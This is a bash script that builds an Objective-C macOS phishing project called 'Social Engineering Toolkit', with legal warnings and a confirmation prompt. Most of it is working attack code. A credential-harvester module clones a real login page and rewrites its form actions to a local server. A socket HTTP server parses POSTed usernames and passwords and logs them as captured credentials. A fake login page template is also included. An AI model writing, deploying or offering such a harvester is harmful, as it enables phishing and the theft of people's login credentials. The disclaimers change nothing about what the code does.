#!/bin/bash

# Social Engineering Toolkit - Objective-C Project Builder
# WARNING: Use only for authorized security testing and educational purposes

PROJECT_NAME="SocialEngineeringToolkit"
PROJECT_DIR="$HOME/Desktop/$PROJECT_NAME"

# Color output for better visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}Building Social Engineering Toolkit (Objective-C)${NC}"
echo -e "${YELLOW}Project will be created at: $PROJECT_DIR${NC}"
echo -e "${RED}WARNING: For authorized security research only!${NC}"
echo ""

# Create directory structure
create_directories() {
    echo -e "${GREEN}Creating directory structure...${NC}"
    
    mkdir -p "$PROJECT_DIR"/{SETCore/{Managers,Models},Modules/{Web\ Attacks,Payloads,Utilities},UI,Resources/Templates}
    mkdir -p "$PROJECT_DIR/SETCore/Managers"
    mkdir -p "$PROJECT_DIR/SETCore/Models"
    mkdir -p "$PROJECT_DIR/Modules/Web\\ Attacks"
    mkdir -p "$PROJECT_DIR/Modules/Payloads"
    mkdir -p "$PROJECT_DIR/Modules/Utilities"
    
    echo -e "${GREEN}✓ Directory structure created${NC}"
}

# Create prefix header
create_prefix_header() {
    cat > "$PROJECT_DIR/SEToolkit_Prefix.pch" << 'EOF'
//
//  SEToolkit_Prefix.pch
//  Social Engineering Toolkit
//

#ifdef __OBJC__
    #import <Foundation/Foundation.h>
    #import <Cocoa/Cocoa.h>
    #import <WebKit/WebKit.h>
    #import <Network/Network.h>
#endif

// Global configuration
#define kDefaultPort 8080
#define kLogPath @"~/Library/Logs/SEToolkit/"
#define kConfigFile @"set.config"
EOF
    echo -e "${GREEN}✓ Created prefix header${NC}"
}

# Create configuration manager
create_config_manager() {
    cat > "$PROJECT_DIR/SETCore/Managers/SETConfigurationManager.h" << 'EOF'
//
//  SETConfigurationManager.h
//  Social Engineering Toolkit
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface SETConfigurationManager : NSObject

@property (nonatomic, strong, readonly) NSDictionary *currentConfig;
@property (nonatomic, assign) NSInteger serverPort;
@property (nonatomic, copy) NSString *serverIP;
@property (nonatomic, assign) BOOL enableLogging;

+ (instancetype)sharedManager;
- (BOOL)loadConfigurationFromFile:(NSString *)filePath;
- (BOOL)saveConfiguration;
- (id)valueForConfigKey:(NSString *)key;

@end

NS_ASSUME_NONNULL_END
EOF

    cat > "$PROJECT_DIR/SETCore/Managers/SETConfigurationManager.m" << 'EOF'
//
//  SETConfigurationManager.m
//  Social Engineering Toolkit
//

#import "SETConfigurationManager.h"

@interface SETConfigurationManager ()
@property (nonatomic, strong) NSMutableDictionary *config;
@end

@implementation SETConfigurationManager

+ (instancetype)sharedManager {
    static SETConfigurationManager *shared = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        shared = [[self alloc] init];
    });
    return shared;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _config = [NSMutableDictionary dictionary];
        _serverPort = 8080;
        _serverIP = @"0.0.0.0";
        _enableLogging = YES;
        
        // Set default configuration
        _config[@"server_port"] = @(8080);
        _config[@"server_ip"] = @"0.0.0.0";
        _config[@"enable_ssl"] = @(NO);
        _config[@"log_level"] = @"INFO";
        _config[@"timeout_seconds"] = @(30);
    }
    return self;
}

- (BOOL)loadConfigurationFromFile:(NSString *)filePath {
    NSString *expandedPath = [filePath stringByExpandingTildeInPath];
    NSDictionary *loadedConfig = [NSDictionary dictionaryWithContentsOfFile:expandedPath];
    
    if (loadedConfig) {
        [self.config addEntriesFromDictionary:loadedConfig];
        
        // Update properties from loaded config
        if (self.config[@"server_port"])
            self.serverPort = [self.config[@"server_port"] integerValue];
        if (self.config[@"server_ip"])
            self.serverIP = self.config[@"server_ip"];
            
        return YES;
    }
    return NO;
}

- (BOOL)saveConfiguration {
    NSString *configPath = [NSString stringWithFormat:@"~/Library/Application Support/SEToolkit/%@", kConfigFile];
    configPath = [configPath stringByExpandingTildeInPath];
    
    // Create directory if needed
    NSString *configDir = [configPath stringByDeletingLastPathComponent];
    [[NSFileManager defaultManager] createDirectoryAtPath:configDir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];
    
    return [self.config writeToFile:configPath atomically:YES];
}

- (id)valueForConfigKey:(NSString *)key {
    return self.config[key];
}

@end
EOF
    echo -e "${GREEN}✓ Created Configuration Manager${NC}"
}

# Create logging manager
create_logging_manager() {
    cat > "$PROJECT_DIR/SETCore/Managers/SETLoggingManager.h" << 'EOF'
//
//  SETLoggingManager.h
//  Social Engineering Toolkit
//

#import <Foundation/Foundation.h>

typedef NS_ENUM(NSInteger, SETLogLevel) {
    SETLogLevelDebug,
    SETLogLevelInfo,
    SETLogLevelWarning,
    SETLogLevelError
};

NS_ASSUME_NONNULL_BEGIN

@interface SETLoggingManager : NSObject

@property (nonatomic, assign) SETLogLevel currentLogLevel;

+ (instancetype)sharedLogger;
- (void)logMessage:(NSString *)message withLevel:(SETLogLevel)level;
- (void)logCredential:(NSString *)username password:(NSString *)password fromSource:(NSString *)source;
- (NSString *)getLogFilePath;

@end

NS_ASSUME_NONNULL_END
EOF

    cat > "$PROJECT_DIR/SETCore/Managers/SETLoggingManager.m" << 'EOF'
//
//  SETLoggingManager.m
//  Social Engineering Toolkit
//

#import "SETLoggingManager.h"

@implementation SETLoggingManager

+ (instancetype)sharedLogger {
    static SETLoggingManager *shared = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        shared = [[self alloc] init];
    });
    return shared;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _currentLogLevel = SETLogLevelInfo;
        
        // Create log directory
        NSString *logPath = [self getLogFilePath];
        NSString *logDir = [logPath stringByDeletingLastPathComponent];
        [[NSFileManager defaultManager] createDirectoryAtPath:logDir
                                  withIntermediateDirectories:YES
                                                   attributes:nil
                                                        error:nil];
    }
    return self;
}

- (void)logMessage:(NSString *)message withLevel:(SETLogLevel)level {
    if (level < self.currentLogLevel) return;
    
    NSString *levelStr;
    switch (level) {
        case SETLogLevelDebug: levelStr = @"DEBUG"; break;
        case SETLogLevelInfo: levelStr = @"INFO"; break;
        case SETLogLevelWarning: levelStr = @"WARNING"; break;
        case SETLogLevelError: levelStr = @"ERROR"; break;
    }
    
    NSString *timestamp = [[NSDate date] description];
    NSString *logEntry = [NSString stringWithFormat:@"[%@] [%@] %@\n", timestamp, levelStr, message];
    
    // Log to console
    printf("%s", [logEntry UTF8String]);
    
    // Write to file
    NSString *logPath = [self getLogFilePath];
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:logPath];
    if (!fileHandle) {
        [logEntry writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    } else {
        [fileHandle seekToEndOfFile];
        [fileHandle writeData:[logEntry dataUsingEncoding:NSUTF8StringEncoding]];
        [fileHandle closeFile];
    }
}

- (void)logCredential:(NSString *)username password:(NSString *)password fromSource:(NSString *)source {
    NSString *credLog = [NSString stringWithFormat:@"CAPTURED: [Source:%@] Username:%@ Password:%@",
                        source, username, password];
    [self logMessage:credLog withLevel:SETLogLevelWarning];
}

- (NSString *)getLogFilePath {
    NSString *logPath = [NSString stringWithFormat:@"~/Library/Logs/SEToolkit/setoolkit_%@.log",
                        [[NSDate date] description]];
    return [logPath stringByExpandingTildeInPath];
}

@end
EOF
    echo -e "${GREEN}✓ Created Logging Manager${NC}"
}

# Create HTTP Server
create_http_server() {
    cat > "$PROJECT_DIR/SETCore/Managers/SETHTTPServer.h" << 'EOF'
//
//  SETHTTPServer.h
//  Social Engineering Toolkit
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@protocol SETHTTPServerDelegate <NSObject>
@optional
- (void)serverDidStartOnPort:(NSInteger)port;
- (void)serverDidReceivePOSTRequest:(NSDictionary *)postData fromIP:(NSString *)clientIP;
- (void)serverDidFailWithError:(NSError *)error;
@end

@interface SETHTTPServer : NSObject

@property (nonatomic, weak) id<SETHTTPServerDelegate> delegate;
@property (nonatomic, assign, readonly) BOOL isRunning;

- (void)startOnPort:(NSInteger)port withDocumentRoot:(NSString *)path;
- (void)stop;
- (void)serveFile:(NSString *)filePath atEndpoint:(NSString *)endpoint;

@end

NS_ASSUME_NONNULL_END
EOF

    cat > "$PROJECT_DIR/SETCore/Managers/SETHTTPServer.m" << 'EOF'
//
//  SETHTTPServer.m
//  Social Engineering Toolkit
//
//  Simplified HTTP server implementation for educational purposes
//

#import "SETHTTPServer.h"
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>

@interface SETHTTPServer ()
@property (nonatomic, assign) NSInteger listeningPort;
@property (nonatomic, assign) int serverSocket;
@property (nonatomic, assign) BOOL isRunning;
@property (nonatomic, strong) NSThread *serverThread;
@property (nonatomic, copy) NSString *documentRoot;
@property (nonatomic, strong) NSMutableDictionary *customEndpoints;
@end

@implementation SETHTTPServer

- (instancetype)init {
    self = [super init];
    if (self) {
        _customEndpoints = [NSMutableDictionary dictionary];
        _isRunning = NO;
        _serverSocket = -1;
    }
    return self;
}

- (void)startOnPort:(NSInteger)port withDocumentRoot:(NSString *)path {
    self.listeningPort = port;
    self.documentRoot = path;
    
    self.serverThread = [[NSThread alloc] initWithTarget:self selector:@selector(runServerLoop) object:nil];
    [self.serverThread start];
}

- (void)runServerLoop {
    // Create socket
    self.serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (self.serverSocket < 0) {
        [self.delegate serverDidFailWithError:[NSError errorWithDomain:@"SETHTTPServer" code:1 userInfo:@{NSLocalizedDescriptionKey: @"Failed to create socket"}]];
        return;
    }
    
    // Set socket options
    int opt = 1;
    setsockopt(self.serverSocket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    // Bind to port
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(self.listeningPort);
    
    if (bind(self.serverSocket, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        [self.delegate serverDidFailWithError:[NSError errorWithDomain:@"SETHTTPServer" code:2 userInfo:@{NSLocalizedDescriptionKey: @"Failed to bind to port"}]];
        return;
    }
    
    // Listen for connections
    listen(self.serverSocket, 5);
    self.isRunning = YES;
    [self.delegate serverDidStartOnPort:self.listeningPort];
    
    // Accept connections loop
    while (self.isRunning) {
        struct sockaddr_in clientAddr;
        socklen_t clientLen = sizeof(clientAddr);
        int clientSocket = accept(self.serverSocket, (struct sockaddr *)&clientAddr, &clientLen);
        
        if (clientSocket >= 0) {
            char clientIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(clientAddr.sin_addr), clientIP, INET_ADDRSTRLEN);
            
            // Handle client in separate thread
            [self performSelectorInBackground:@selector(handleClient:) withObject:@{
                @"socket": @(clientSocket),
                @"ip": [NSString stringWithUTF8String:clientIP]
            }];
        }
    }
    
    close(self.serverSocket);
}

- (void)handleClient:(NSDictionary *)clientInfo {
    int clientSocket = [clientInfo[@"socket"] intValue];
    NSString *clientIP = clientInfo[@"ip"];
    
    // Read HTTP request
    char buffer[4096];
    ssize_t bytesRead = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    
    if (bytesRead > 0) {
        buffer[bytesRead] = '\0';
        NSString *request = [NSString stringWithUTF8String:buffer];
        
        // Parse request (simplified)
        if ([request hasPrefix:@"POST"]) {
            // Extract POST data
            NSRange bodyRange = [request rangeOfString:@"\r\n\r\n"];
            if (bodyRange.location != NSNotFound) {
                NSString *postBody = [request substringFromIndex:bodyRange.location + 4];
                NSMutableDictionary *postParams = [NSMutableDictionary dictionary];
                
                // Parse URL encoded parameters
                NSArray *pairs = [postBody componentsSeparatedByString:@"&"];
                for (NSString *pair in pairs) {
                    NSArray *keyValue = [pair componentsSeparatedByString:@"="];
                    if (keyValue.count == 2) {
                        NSString *key = [keyValue[0] stringByRemovingPercentEncoding];
                        NSString *value = [keyValue[1] stringByRemovingPercentEncoding];
                        if (key && value) {
                            postParams[key] = value;
                        }
                    }
                }
                
                if (postParams.count > 0) {
                    [self.delegate serverDidReceivePOSTRequest:postParams fromIP:clientIP];
                }
            }
            
            // Send response
            NSString *response = @"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h1>Thank you</h1></body></html>";
            send(clientSocket, [response UTF8String], [response lengthOfBytesUsingEncoding:NSUTF8StringEncoding], 0);
        } else {
            // Serve file for GET requests
            [self serveStaticFile:clientSocket request:request];
        }
    }
    
    close(clientSocket);
}

- (void)serveStaticFile:(int)socket request:(NSString *)request {
    // Extract requested path (simplified)
    NSRange getRange = [request rangeOfString:@"GET /"];
    if (getRange.location != NSNotFound) {
        NSRange endRange = [request rangeOfString:@"HTTP" options:0 range:NSMakeRange(getRange.location + 5, request.length - (getRange.location + 5))];
        if (endRange.location != NSNotFound) {
            NSString *filePath = [request substringWithRange:NSMakeRange(getRange.location + 5, endRange.location - (getRange.location + 5) - 1)];
            
            if ([filePath isEqualToString:@""]) {
                filePath = @"index.html";
            }
            
            NSString *fullPath = [self.documentRoot stringByAppendingPathComponent:filePath];
            
            if ([[NSFileManager defaultManager] fileExistsAtPath:fullPath]) {
                NSData *fileData = [NSData dataWithContentsOfFile:fullPath];
                NSString *response = [NSString stringWithFormat:@"HTTP/1.1 200 OK\r\nContent-Length: %lu\r\n\r\n", (unsigned long)fileData.length];
                send(socket, [response UTF8String], [response lengthOfBytesUsingEncoding:NSUTF8StringEncoding], 0);
                send(socket, fileData.bytes, fileData.length, 0);
            } else {
                NSString *response = @"HTTP/1.1 404 Not Found\r\n\r\n<html><body><h1>404 Not Found</h1></body></html>";
                send(socket, [response UTF8String], [response lengthOfBytesUsingEncoding:NSUTF8StringEncoding], 0);
            }
        }
    }
}

- (void)serveFile:(NSString *)filePath atEndpoint:(NSString *)endpoint {
    [self.customEndpoints setObject:filePath forKey:endpoint];
}

- (void)stop {
    self.isRunning = NO;
    if (self.serverSocket >= 0) {
        close(self.serverSocket);
        self.serverSocket = -1;
    }
}

@end
EOF
    echo -e "${GREEN}✓ Created HTTP Server${NC}"
}

# Create Credential Harvester module
create_credential_harvester() {
    cat > "$PROJECT_DIR/Modules/Web\\ Attacks/CredentialHarvester.h" << 'EOF'
//
//  CredentialHarvester.h
//  Social Engineering Toolkit
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface CredentialHarvester : NSObject

- (void)startHarvestingWithURL:(NSString *)urlToClone onPort:(NSInteger)port;
- (void)stopHarvesting;
- (BOOL)cloneLoginPage:(NSString *)sourceURL toLocalPath:(NSString *)localPath;

@end

NS_ASSUME_NONNULL_END
EOF

    cat > "$PROJECT_DIR/Modules/Web\\ Attacks/CredentialHarvester.m" << 'EOF'
//
//  CredentialHarvester.m
//  Social Engineering Toolkit
//

#import "CredentialHarvester.h"
#import "../../SETCore/Managers/SETHTTPServer.h"
#import "../../SETCore/Managers/SETLoggingManager.h"

@interface CredentialHarvester () <SETHTTPServerDelegate>
@property (strong, nonatomic) SETHTTPServer *server;
@property (copy, nonatomic) NSString *clonedSitePath;
@end

@implementation CredentialHarvester

- (void)startHarvestingWithURL:(NSString *)urlToClone onPort:(NSInteger)port {
    // Create temporary directory for cloned site
    NSString *tempDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"SET_Clone"];
    [[NSFileManager defaultManager] createDirectoryAtPath:tempDir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];
    self.clonedSitePath = tempDir;
    
    // Clone the login page
    if ([self cloneLoginPage:urlToClone toLocalPath:tempDir]) {
        // Start HTTP server
        self.server = [[SETHTTPServer alloc] init];
        self.server.delegate = self;
        [self.server startOnPort:port withDocumentRoot:tempDir];
        
        [[SETLoggingManager sharedLogger] logMessage:[NSString stringWithFormat:@"Credential harvester started on port %ld, cloned from %@", (long)port, urlToClone]
                                           withLevel:SETLogLevelInfo];
    } else {
        [[SETLoggingManager sharedLogger] logMessage:@"Failed to clone login page" withLevel:SETLogLevelError];
    }
}

- (BOOL)cloneLoginPage:(NSString *)sourceURL toLocalPath:(NSString *)localPath {
    // Download the source HTML
    NSURL *url = [NSURL URLWithString:sourceURL];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    NSError *error = nil;
    
    NSData *htmlData = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:&error];
    
    if (error || !htmlData) {
        return NO;
    }
    
    NSString *htmlString = [[NSString alloc] initWithData:htmlData encoding:NSUTF8StringEncoding];
    
    // Modify form actions to point to our server
    // This is a simplified example - production would need more robust parsing
    htmlString = [htmlString stringByReplacingOccurrencesOfString:@"action=\""
                                                        withString:@"action=\"http://localhost:8080/"];
    htmlString = [htmlString stringByReplacingOccurrencesOfString:@"action='"
                                                        withString:@"action='http://localhost:8080/"];
    
    // Save modified HTML
    NSString *indexPath = [localPath stringByAppendingPathComponent:@"index.html"];
    [htmlString writeToFile:indexPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    return YES;
}

- (void)stopHarvesting {
    [self.server stop];
    [[SETLoggingManager sharedLogger] logMessage:@"Credential harvester stopped" withLevel:SETLogLevelInfo];
}

#pragma mark - SETHTTPServerDelegate

- (void)serverDidReceivePOSTRequest:(NSDictionary *)postData fromIP:(NSString *)clientIP {
    // Log captured credentials
    NSString *username = postData[@"username"] ?: postData[@"email"] ?: @"unknown";
    NSString *password = postData[@"password"] ?: @"unknown";
    
    [[SETLoggingManager sharedLogger] logCredential:username password:password fromSource:clientIP];
}

- (void)serverDidStartOnPort:(NSInteger)port {
    [[SETLoggingManager sharedLogger] logMessage:[NSString stringWithFormat:@"Harvester server running on port %ld", (long)port]
                                       withLevel:SETLogLevelInfo];
}

- (void)serverDidFailWithError:(NSError *)error {
    [[SETLoggingManager sharedLogger] logMessage:[NSString stringWithFormat:@"Server error: %@", error.localizedDescription]
                                       withLevel:SETLogLevelError];
}

@end
EOF
    echo -e "${GREEN}✓ Created Credential Harvester Module${NC}"
}

# Create main application delegate
create_app_delegate() {
    cat > "$PROJECT_DIR/UI/AppDelegate.h" << 'EOF'
//
//  AppDelegate.h
//  Social Engineering Toolkit
//

#import <Cocoa/Cocoa.h>

@interface AppDelegate : NSObject <NSApplicationDelegate>

@end
EOF

    cat > "$PROJECT_DIR/UI/AppDelegate.m" << 'EOF'
//
//  AppDelegate.m
//  Social Engineering Toolkit
//

#import "AppDelegate.h"
#import "../SETCore/Managers/SETConfigurationManager.h"
#import "../SETCore/Managers/SETLoggingManager.h"
#import "../Modules/Web Attacks/CredentialHarvester.h"

@interface AppDelegate ()
@property (strong, nonatomic) CredentialHarvester *harvester;
@end

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    // Initialize managers
    [[SETConfigurationManager sharedManager] loadConfigurationFromFile:@"~/Library/Application Support/SEToolkit/set.config"];
    [[SETLoggingManager sharedLogger] logMessage:@"Social Engineering Toolkit Started" withLevel:SETLogLevelInfo];
    
    // Example usage - start credential harvester
    // Uncomment to run (for authorized testing only!)
    /*
    self.harvester = [[CredentialHarvester alloc] init];
    [self.harvester startHarvestingWithURL:@"https://github.com/login" onPort:8080];
    */
    
    NSLog(@"SEToolkit is running. Configure attacks programmatically.");
}

- (void)applicationWillTerminate:(NSNotification *)aNotification {
    [self.harvester stopHarvesting];
    [[SETLoggingManager sharedLogger] logMessage:@"Social Engineering Toolkit Terminated" withLevel:SETLogLevelInfo];
}

@end
EOF
    echo -e "${GREEN}✓ Created App Delegate${NC}"
}

# Create configuration file and HTML templates
create_resources() {
    # Create config plist
    cat > "$PROJECT_DIR/Resources/set.config" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>server_port</key>
    <integer>8080</integer>
    <key>server_ip</key>
    <string>0.0.0.0</string>
    <key>enable_ssl</key>
    <false/>
    <key>log_level</key>
    <string>INFO</string>
    <key>timeout_seconds</key>
    <integer>30</integer>
    <key>user_agent</key>
    <string>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36</string>
</dict>
</plist>
EOF

    # Create fake login page template
    cat > "$PROJECT_DIR/Resources/Templates/fake_login.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .login-box { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
        input { width: 100%; padding: 10px; margin: 5px 0; }
        button { width: 100%; padding: 10px; background-color: #007bff; color: white; border: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Please Login</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
EOF

    echo -e "${GREEN}✓ Created resource files${NC}"
}

# Create Xcode project file
create_xcode_project() {
    cat > "$PROJECT_DIR/SocialEngineeringToolkit.xcodeproj/project.pbxproj" << 'EOF'
// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {
		/* Begin PBXFileReference section */
		/* This is a simplified project file - regenerate with actual Xcode for full functionality */
		/* End PBXFileReference section */
	};
	rootObject = /* Main group */;
}
EOF
    
    mkdir -p "$PROJECT_DIR/SocialEngineeringToolkit.xcodeproj"
    echo -e "${GREEN}✓ Created Xcode project structure${NC}"
}

# Create README with legal notice
create_readme() {
    cat > "$PROJECT_DIR/README.md" << 'EOF'
# Social Engineering Toolkit (Objective-C)

## ⚠️ LEGAL WARNING ⚠️

This tool is for **EDUCATIONAL PURPOSES ONLY** and **AUTHORIZED SECURITY TESTING**.

**UNAUTHORIZED USE IS ILLEGAL** and may violate:
- Computer Fraud and Abuse Act (CFAA)
- Various international cybercrime laws
- Terms of Service violations

**You must have WRITTEN PERMISSION** from the system owner before using this toolkit.

## Purpose

This implementation demonstrates:
- Objective-C networking concepts
- HTTP server implementation
- Web scraping and HTML manipulation
- Security awareness training tools

## Building the Project

1. Open `SocialEngineeringToolkit.xcodeproj` in Xcode
2. Build for macOS (not iOS)
3. Run only in controlled, authorized environments

## Responsible Usage

This code should only be used for:
- Security awareness training with permission
- Educational demonstrations in isolated labs
- Authorized penetration testing engagements

## Legal Compliance

Users of this software are solely responsible for ensuring compliance with all applicable laws and regulations.

**NEVER USE THIS AGAINST SYSTEMS YOU DO NOT OWN OR HAVE EXPLICIT PERMISSION TO TEST.**

## Features (Educational)

- Credential harvesting simulation
- Custom HTTP server implementation
- Logging and monitoring
- Configurable attack parameters

## Note

This is a demonstration only. For legitimate security testing, use established frameworks like Metasploit or the original Python SET with proper authorization.
EOF
    echo -e "${GREEN}✓ Created README with legal notice${NC}"
}

# Create build script
create_build_script() {
    cat > "$PROJECT_DIR/build.sh" << 'EOF'
#!/bin/bash

echo "Building Social Engineering Toolkit..."
echo "NOTE: This requires Xcode command line tools"

# Check for Xcode
if ! xcodebuild -version &> /dev/null; then
    echo "Error: Xcode not found. Please install Xcode from Mac App Store"
    exit 1
fi

# Create build directory
mkdir -p build

# Compile (simplified - use Xcode project for full build)
echo "Please open SocialEngineeringToolkit.xcodeproj in Xcode to build"
echo "Or use: xcodebuild -project SocialEngineeringToolkit.xcodeproj -scheme SocialEngineeringToolkit build"

# Make scripts executable
chmod +x build.sh

echo "Build preparation complete"
EOF
    
    chmod +x "$PROJECT_DIR/build.sh"
    echo -e "${GREEN}✓ Created build script${NC}"
}

# Main execution
main() {
    echo -e "${RED}========================================${NC}"
    echo -e "${RED}  SOCIAL ENGINEERING TOOLKIT BUILDER  ${NC}"
    echo -e "${RED}========================================${NC}"
    echo ""
    
    read -p "Do you confirm this is for EDUCATIONAL/AUTHORIZED use only? (yes/no): " confirmation
    
    if [[ "$confirmation" != "yes" ]]; then
        echo -e "${RED}Aborted. This tool requires confirmation for legal compliance.${NC}"
        exit 1
    fi
    
    create_directories
    create_prefix_header
    create_config_manager
    create_logging_manager
    create_http_server
    create_credential_harvester
    create_app_delegate
    create_resources
    create_xcode_project
    create_readme
    create_build_script
    
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}Project built successfully!${NC}"
    echo -e "${GREEN}Location: $PROJECT_DIR${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo ""
    echo -e "${YELLOW}Next steps:${NC}"
    echo "1. cd $PROJECT_DIR"
    echo "2. open SocialEngineeringToolkit.xcodeproj"
    echo "3. Build and run in Xcode"
    echo ""
    echo -e "${RED}REMEMBER: Use only for authorized security testing!${NC}"
}

# Run main function
main
